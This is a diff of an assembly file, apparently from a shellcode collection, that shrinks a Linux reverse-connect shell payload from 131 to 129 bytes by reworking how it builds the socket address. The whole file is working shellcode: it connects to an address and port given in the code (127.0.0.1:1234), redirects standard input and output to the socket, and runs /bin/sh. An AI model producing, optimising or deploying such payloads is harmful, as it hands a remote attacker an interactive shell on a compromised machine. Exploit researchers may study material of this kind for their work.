@@ -27,7 +27,7 @@
 ;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;
-; 131 byte reverse connect shell
+; 129 byte reverse connect shell
 ;
 ; Tested on 32 and 64-bit versions of Linux
 ;
@@ -37,16 +37,19 @@
     ; sa.sin_family = AF_INET;
     ; sa.sin_addr   = inet_addr("127.0.0.1");
     ; sa.sin_port   = htons(1234);
-    mov     ecx, ~0xD2040002 & 0xFFFFFFFF 
-    mov     edx, ~0x0100007f & 0xFFFFFFFF 
-    not     ecx
-    not     edx
+    mov     eax, ~0xD2040002 & 0xFFFFFFFF 
+    mov     ebx, ~0x0100007f & 0xFFFFFFFF 
+    not     eax
+    not     ebx
     ; create space for sa
     push    eax
     push    eax
-    mov     dword[esp+0], ecx ; save port
-    mov     dword[esp+4], edx ; save ip
-    push    esp               ; &sa
+    push    esp
+    pop     edi
+    stosd
+    xchg    eax, ebx
+    stosd
+    push    esp         ; &sa
     pop     ebp
     
     ; step 1, create a socket
@@ -72,7 +75,7 @@
     ; dup2 (s, STDOUT_FILENO)
     ; dup2 (s, STDERR_FILENO)
 x64_dup2:
-    mov     al, 33      ; rax=sys_dup2
+    mov     al, 33      ; rax = sys_dup2
     syscall
     sub     esi, 1
     jns     x64_dup2    ; jump if not signed
@@ -123,8 +126,8 @@ x86_dup2:
     
     ; execve("/bin//sh", NULL, NULL);
 x84_execve:
-    cdq                 ; envp=NULL
-    xor     esi, esi    ; argv=NULL
+    cdq                 ; envp = NULL
+    xor     esi, esi    ; argv = NULL
     push    eax         ; '\0'
     push    eax         ; null space
     push    eax         ; null space
@@ -142,6 +145,4 @@ x86_execve:
     xor     ecx, ecx    ; argv = NULL
     mov     al, 11      ; eax  = sys_execve
     int     0x80
-    
-    
-    
+        
